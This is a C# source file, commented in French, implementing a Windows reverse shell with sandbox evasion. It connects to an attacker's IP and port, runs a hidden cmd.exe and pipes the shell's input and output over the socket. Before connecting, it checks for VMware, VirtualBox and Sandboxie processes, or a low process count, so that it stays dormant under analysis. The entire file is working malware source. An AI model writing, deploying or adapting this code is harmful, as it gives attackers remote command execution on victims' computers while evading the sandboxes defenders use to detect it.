using System.Diagnostics;
using System.Management;
using System.Net.Sockets;
using System.Text;
using System.Collections.Generic;
using System.Reflection.PortableExecutable;

public class Progam
{
    static StreamWriter streamWriter;

    public static void Main(string[] args)
    {
        String IP = "<IP ADRESS>"; //change me
        int port = 0; //change me

        bool inSandbox = DetermineIfInSandbox();
        
        if (inSandbox)
        {
            while (true)
            {
                Console.WriteLine("Je suis dans une sandbox, je ne m'exécute pas.");
            }

        } else
        {
            using (TcpClient client = new TcpClient(IP, port))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;

                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);

                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(reader.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }
    }


    private static bool DetermineIfInSandbox()
    {
        bool result = false;

        int countProcessSbieSvc = 0;
        int nbProcesses = 0;

        /*
         * Est-ce que le processus "vmtoolsd" est lancé ? 
         */
        Process[] processVmtoolsd = Process.GetProcessesByName("vmtoolsd");
        
        /*
         * Est-ce que le processus "vbox.exe" est lancé ? 
         */
        Process[] processVbox = Process.GetProcessesByName("vbox.exe");

        /**
         * Récupération du nombre de processus nommé "SbieSvc" en cours d'exécution
         */
        Process[] processCollection = Process.GetProcesses();
        foreach (Process p in processCollection)
        {
            if (p.ProcessName == "SbieSvc")
            {
                countProcessSbieSvc += 1;
            }
        }
    
        /*
         * Récupératio du nombre de programme en cours d'exécution
         */
        String commandTasklist = "/C tasklist /fi \"STATUS eq running\" | findstr -i .exe | find /v /c \"\"";

        System.Diagnostics.Process process = new System.Diagnostics.Process();
        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
        startInfo.FileName = "cmd.exe";
        startInfo.Arguments = commandTasklist;
        process.StartInfo = startInfo;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.UseShellExecute = false;
        process.Start();
        String output = process.StandardOutput.ReadToEnd();
        nbProcesses = Convert.ToInt32(output) - 1;
        process.Close();

        /*
         * S'il y a strictement plus que 3 processus SbieSvc lancés, ou si le processus "vbox.exe" est lancé, ou si le processus "vmtoolsd" est lancé, 
         * ou si le nombre de processus lancé est strictement inférieur à 15, alors le programme est dans une sandbox
         */
        if (countProcessSbieSvc > 3 || processVbox.Length > 0 || processVmtoolsd.Length > 0 || nbProcesses < 15)
        {
            result = true;
        }

        return result;
    }

    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outline)
    {
        StringBuilder strOutput = new StringBuilder();

        if (!String.IsNullOrEmpty(outline.Data))
        {
            try
            {
                strOutput.Append(outline.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
            catch (Exception err) { }
        }
    }

}
